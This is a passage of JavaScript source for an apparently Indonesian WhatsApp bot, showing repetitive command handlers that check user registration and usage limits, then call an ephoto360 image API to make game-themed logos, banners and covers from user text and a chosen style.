g-2','nonkeyking-1','nonkeyking-0','nissfortune-9','nissfortune-8','nissfortune-7','nissfortune-6','nissfortune-5','nissfortune-4','nissfortune-3','nissfortune-2','nissfortune-1','nissfortune-0','nasteryi-3','nasteryi-2','nasteryi-1','nasteryi-0','nasteryi-9','nasteryi-5','nasteryi-4','nasteryi-10','naokai-7','naokai-6','naokai-5','naokai-4','naokai-3','naokai-2','naokai-1','naokai-0','nalzahar-5','nalzahar-4','nalzahar-3','nalzahar-2','nalzahar-1','nalzahar-0','nalphite-7','nalphite-6','nalphite-5','nalphite-4','nalphite-3','nalphite-2','nalphite-1','nalphite-0','lux-7','lux-6','lux-5','lux-4','lux-3','lux-2','lux-1','lux-0','lulu-6','lulu-5','lulu-4','lulu-3','lulu-2','lulu-1','lulu-0','lucian-6','lucian-7','lucian-2','lucian-1','lucian-0','lissandra-3','lissandra-2','lissandra-1','lissandra-0','leona-9','leona-8','leona-7','leona-6','leona-5','leona-4','leona-3','leona-2','leona-1','leona-0','leesin-6','leesin-5','leesin-4','leesin-3','leesin-2','leesin-1','leesin-0','leesin-10','leesin-11','leblanc-5','leblanc-4','leblanc-3','leblanc-2','leblanc-1','leblanc-0','kogmaw-9','kogmaw-8','kogmaw-7','kogmaw-6','kogmaw-5','kogmaw-4','kogmaw-3','kogmaw-2','kogmaw-1','kogmaw-0','kled-1','kled-0','kindred-2','kindred-1','kindred-0','khazix-4','khazix-3','khazix-2','khazix-1','khazix-0','kennen-7','kennen-6','kennen-5','kennen-4','kennen-3','kennen-2','kennen-1','kennen-0','kayle-8','kayle-7','kayle-6','kayle-5','kayle-4','kayle-3','kayle-2','kayle-1','kayle-0','katarina-9','katarina-8','katarina-7','katarina-5','katarina-6','katarina-4','katarina-3','katarina-2','katarina-1','kassadin-4','kassadin-3','kassadin-2','kassadin-1','kassadin-0','karthus-9','karthus-5','karthus-4','karthus-3','karthus-2','karthus-1','karthus-0','karma-7','karma-6','karma-5','karma-4','karma-3','karma-2','karma-1','karma-0','kalista-3','kalista-2','kalista-1','kalista-0','jinx-4','jinx-3','jinx-2','jinx-1','jinx-0','jayce-4','jayce-3','jayce-2','jayce-1','jayce-0','jax-9','jax-8','jax-7','jax-6','jax-5','jax-4','jax-3','jax-2','jax-1','jax-0','jarvaniv-6','jarvaniv-5','jarvaniv-4','jarvaniv-3','jarvaniv-2','jarvaniv-1','jarvaniv-0','janna-7','janna-6','janna-5','janna-4','janna-3','janna-2','janna-1','ivern-1','ivern-0','irelia-5','irelia-4','irelia-3','irelia-2','irelia-1','irelia-0','illaoi-1','illaoi-0','heimerdinger-5','heimerdinger-4','heimerdinger-3','heimerdinger-2','heimerdinger-1','heimerdinger-0','hecarim-6','hecarim-5','hecarim-4','hecarim-3','hecarim-2','hecarim-1','hecarim-0','graves-7','graves-6','graves-5','graves-4','graves-3','graves-2','graves-1','graves-0','gragas-9','gragas-8','gragas-7','gragas-6','gragas-5','gragas-4','gragas-3','gragas-3','gragas-2','gragas-1','gragas-0','gnar-4','gnar-3','gnar-2','gnar-1','gnar-0','garen-6','garen-5','garen-4','garen-3','garen-2','garen-1','garen-0','garen-10','garen-11','gangplank-8','gangplank-7','gangplank-6','gangplank-5','gangplank-4','gangplank-3','gangplank-2','gangplank-1','gangplank-0','galio-5','galio-4','galio-3','galio-2','galio-1','galio-0','fizz-9','fizz-8','fizz-4','fizz-3','fizz-2','fizz-1','fizz-0','fiora-5','fiora-4','fiora-3','fiora-2','fiora-1','fiora-0','fiddlesticks-7','fiddlesticks-6','fiddlesticks-5','fiddlesticks-4','fiddlesticks-3','fiddlesticks-2','fiddlesticks-1','fiddlesticks-0','ezreal-9','ezreal-8','ezreal-7','ezreal-6','ezreal-5','ezreal-4','ezreal-3','ezreal-2','ezreal-1','ezreal-0','evelynn-4','evelynn-3','evelynn-2','evelynn-1','evelynn-0','elise-4','elise-3','elise-2','elise-1','elise-0','ekko-3','ekko-2','ekko-1','ekko-0','draven-6','draven-5','draven-4','draven-3','draven-2','draven-1','draven-0','drmundo-9','drmundo-8','drmundo-7','drmundo-6','drmundo-5','drmundo-4','drmundo-3','drmundo-2','drmundo-1','drmundo-0','diana-3','diana-2','diana-1','diana-0','diana-11','darius-8','darius-4','darius-3','darius-2','darius-1','darius-0','darius-14','corki-8','corki-7','corki-6','corki-5','corki-4','corki-3','corki-2','corki-1','corki-0','chogath-6','chogath-5','chogath-4','chogath-3','chogath-2','chogath-1','chogath-0','cassiopeia-4','cassiopeia-3','cassiopeia-2','cassiopeia-1','cassiopeia-0','camille-1','camille-0','caitlyn-6','caitlyn-5','caitlyn-4','caitlyn-3','caitlyn-2','caitlyn-1','caitlyn-0','caitlyn-10','caitlyn-11','braum-3','braum-2','braum-1','braum-0','braum-10','brand-5','brand-4','brand-3','brand-2','brand-1','brand-0','blitzcrank-7','blitzcrank-6','blitzcrank-5','blitzcrank-4','blitzcrank-3','blitzcrank-2','blitzcrank-1','blitzcrank-0','blitzcrank-11','bard-6','bard-5','bard-4','bard-3','bard-2','bard-1','bard-0','azir-4','azir-3','azir-2','azir-1','azir-0','aurelionsol-1','aurelionsol-0','ashe-8','ashe-7','ashe-6','ashe-5','ashe-4','ashe-3','ashe-2','ashe-1','ashe-0','annie-9','annie-8','annie-7','annie-6','annie-5','annie-4','annie-3','annie-2','annie-1','annie-0','annie-10','anivia-7','anivia-6','anivia-5','anivia-4','anivia-3','anivia-2','anivia-1','anivia-0','amumu-8','amumu-7','amumu-6','amumu-5','amumu-4','amumu-3','amumu-2','amumu-1','amumu-0','alistar-9','alistar-8','alistar-7','alistar-6','alistar-5','alistar-4','alistar-3','alistar-2','alistar-1','alistar-0','akali-8','akali-7','akali-6','akali-5','akali-4','akali-3','akali-2','akali-1','akali-0','ahri-7','ahri-6','ahri-5','ahri-4','ahri-3','ahri-2','ahri-1','ahri-0','aatrox-3','aatrox-2','aatrox-1','aatrox-0','zacskt','teemoskt','olafskt','namiskt','syndraskt','jhinskt','ekkoskt','urgot-8','urgot-7','urgot-6','urgot-5','kayn-2','kayn','sona-8','veigaros','twitchos','tristanaos','fizzos','zigg','nalzah01','kayle','hecarim','brand','ornn2','ornn','syndra','soraka','nissfortune','ezreal','ahri','yorick','singed','nasteryi','janna','fiora','cassiopeia','ashe','zed','viktor','nidalee','katarina','gnar','evelynn-7','evelynn-6','evelynn-5','evelynn','elise','annie','rengar','blitzcrank-9','blitzcrank-8','zoe-2','zoe','vi','vayne','varus','poppy','kogmaw','jinx','jhin','jax','graves','draven','xinzhao','warwick','swain-8','swain-7','swain-6','swain-5','swain-4','rakan','nasus','nissfortune-15','nissfortune-14','nissfortune-13','nissfortune-12','nissfortune-11','nissfortune-10','lux','kaisa-2','kaisa','jarvan-iv','illaoi','gragas','wukong','sivir','nissfortune-16','irelia-11','irelia-10','irelia-9','irelia-8','irelia-7','irelia-6','galio','alistar','varus-7','twistedfate','teemo','shen','rumble','riven','evelynn-8','zoe3','xinzhao-7','urgot','thresh','talon','taliya','pyke-2','pyke','poppy-8','nunu-15','nunu-14','nunu-13','nunu-12','nunu-11','nunu-10','nunu-9','nunu-8','lulu','lucian','jarvan-iv-7','irelia-12','garen','gangplank','darius','caitlyn','braum','aurelionsol-2','ashe-9','akali-18','akali-17','akali-16','akali-15','akali-14','akali-13','akali-12','akali-11','akali-10','akali-9','aatrox-7','aatrox-6','aatrox-5','aatrox-4','ziggs-6','yasuo','sona','nalphite','khazix','kayn-3','jinx-5']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'lolcoverbyname':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('avatar', 'yorick', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('avatar', 'yorick', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['zyra','zilean','ziggs','zed','zac','yorick','yasuo','xinzhao','xerath','xayah','wukong','warwick','volibear','vladimir','viktor','vi','velkoz','veigar','vayne','varus','urgot','udyr','twictch','tryndamere','trundle','tristana','thresh','twistedfate','teemo','taric','talon','taliyah','tahmkench','syndra','swain','soraka','sona','skarner','sivir','sion','singed','shyvana','shen','shaco','sejuani','ryze','rumble','riven','rengar','renekton','reksai','rammus','rakan','quinn','poppy','pantheon','orianna','olaf','nunu','nasteryi','naokai','nalzahar','nalphite','lux','lulu','lucian','nocturne','nedalee','nautilus','nasus','nami','norgana','noderkaiser','nissfortune','lissandra','leona','leesin','leblanc','kogmaw','kled','kindred','khazix','kennen','kayn','kayle','katarina','kassadin','karthus','karma','kalista','jinx','jhin','jayce','jax','jarvan','janna','ivern','irelia','illaoi','heimerdinger','hecarim','graves','gragas','gnar','garen','gangplank','galio','fizz','fiora','fiddlesticks','ezreal','drmundo','evelynn','elise','ekko','draven','diana','darius','corki','chogath','cassiopeia','camille','caitlyn','braum','brand','blitzcrank','bard','azir','aurelionsol','ashe','annie','anivia','amumu','alistar','akali','ahri','aatrox','zoe','sylas','swain-2','pyke','nunu-2','neeko','norgana2','kayle-2','kaisa','evelynn-2','aatrox-2']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Avatar')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, avatar : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'cyberhunterfb':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', '10', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', '10', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['1','2','3','4','5','6','7','8','9','10','11','12']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'coverfreefirefb':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'kelly', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'kelly', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['a124','alok','alvaro','andrew','antonio','caroline','hayato','kapella','kelly','kla','laura','naxim','niguel','nisa','noco','nikita','notora','olivia','paloma','rafael','shani','steffie']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'gamingmascot':{
if (!text) return reply(lang.maketeamlogo('style', 'reaper', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'reaper', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['bear-2','dragon-2','hydra','lion','reaper','wolf-2','bear','eagle','iguana','shark','snake','spartan','griffin','owl','wolf','tiger','wolver','dragon']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'coveronepiecefb':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('character', 'franky', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'franky', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['ace','brook','chopper','franky','garp','jinbei','law','luffy','nerry','nami','rayleigh','robin','sabo','sanji','shanks','sunny','usopp','zoro']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'bannerytcsgo':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('banner', 'banner-3', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('banner', 'banner-3', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['banner-1','banner-2','banner-3','banner-4','banner-5','banner-6','banner-7']
		if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Banner')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, banner : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'fbgamepubgcover':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.maketeamlogo('template', 'cover-4', prefix, command))
if (!text.includes('|')) return reply(lang.maketeamlogo('template', 'cover-4', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
const style = ['cover-1','cover-2','cover-3','cover-4','cover-5','cover-6','cover-7','cover-8','cover-9','cover-10','cover-11','cover-12']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Template')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, template : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'banneroflol':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'banner', 'veigar', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'banner', 'veigar', 'zeeone', 'ofc', prefix, command))
var memek = args.join(" ").split("|")
var m1 = memek[0]
var m2 = memek[1]
var m3 = memek[2]
const style = ['ahri-2','neeko','nocturne','shen-2','veigar','rakanayah-2','zoe-2','pantheon-2','rammus','udyr','darius-2','ekko-2','lablanc','leona','nissfotune','poppy','quinn','talon-2','akali-2','irelia-2','jinx-2','nordekaiser','pyke-2','renekton','rengar','sivir','sona','soraka','tristana','warwick','yuumi','ziggs','leesin','lulu','lux','naster-yi','norgana','nasus','pantheon','pyke','qiyana','rakan','rakanxayah','riven','shen','sylas','talon','teemo','thresh','tryndamere','varus','vayne','velkoz','vladimir','yasuo','zed','zoe','hecarim','heimerdinger','illaoi','irelia','ivern','janna','jarvan-iv','jax','jayce','jhin','jinx','kaisa','kalista','karma','karthus','kassadin','katarina','kayle','kayn','kennen','khazix','kindred','kled','kogmaw','aatrox','ahri','akali','alistar','amumu','anivia','annie','ashe','aurelionsol','azir','bard','blitzcrank','brand','braum','caitlyn','camille','cassiopeia','chogath','corki','darius','diana','drmundo','draven','ekko','elise','evelynn','ezreal','fiddlesticks','fiora','fizz','galio','gangplank','garen','gnar','gragas','graves']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Banner')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
	let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, banner : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'bannerofaov2':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'banner', 'ishar', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'banner', 'ishar', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'banner', 'ishar', 'zeeone', 'ofc', prefix, command))
const style = ['airi-2','aleister','astrid-2','ata','butterfly-2','dirak','ignis-2','ishar','jinna','lauriel-3','nina-2','natalya-2','omen-2','qi-2','quillen3','raz','roxie-2','ryoma-2','taara-2','violet-3','wukong-4','wukong-3','krixi-2','krizziz','nurad-5','volkath','wisp-2','wukong-2','enzo-2','hayate-2','annette-2','capheny-2','celica','gildur-2','lauriel-2','nurad-4','quillen-2','sephera-2','qi','nurad-3','nurad-2','nakroth-2','zip','diao-chan-2','enzo','errol','joker','payna','slimz','thane','toro','veres','violet-2','wisp','yena','zill','arduin','arthur','batman','capheny','darcy','elsu','florentino','gildur','ignis','wukong','yena','zanis','violet','tulen','sephera','nurad','nina','lindis','liliana','lauriel','krixi','kahlii','hayate','diao-chan','butterfly','astrid','arum','annette','amily','airi','zuka','zephys','zanis','yorn','xeniel','veres','veera','tel-annas','taara','superman','skud','ryoma','roxie','quillen','omen','natalya','nakroth','lubu']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Banner')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, banner : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'teamlogo':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'buffalo', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'buffalo', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', 'buffalo', 'zeeone', 'ofc', prefix, command))
const style = ['cobra','dragon','eagle2','falcon','lion2','tiger2','bear','buffalo','eagle','lion','tiger','wolf']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'companylogo2':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '16', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '16', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '16', 'zeeone', 'ofc', prefix, command))
const style = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18']
if (!style.includes(m3)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Background')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1,text2: m2, background : m3}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
	case 'companylogo':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '20', 'zeeone', 'ofc', prefix, command))
if (!text.includes('|')) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '20', 'zeeone', 'ofc', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
var m3 = mon.split("|")[2]
if (!m3) return reply(lang.MaketeamlogoT('teks', 'teks2', 'background', '20', 'zeeone', 'ofc', prefix, command))
const style = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26']
if (!style.includes(m3)){ 
